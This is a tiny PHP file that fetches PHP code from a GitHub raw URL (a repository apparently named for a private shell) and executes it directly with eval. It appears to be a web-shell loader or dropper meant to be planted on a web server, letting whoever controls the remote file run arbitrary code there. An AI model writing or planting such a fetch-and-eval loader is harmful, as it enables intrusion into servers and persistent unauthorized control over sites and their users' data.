<?php 
$url = "https://raw.githubusercontent.com/zer04lone/shellpribadi/main/ganesh.php";
$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
eval("?>".$result);

?>
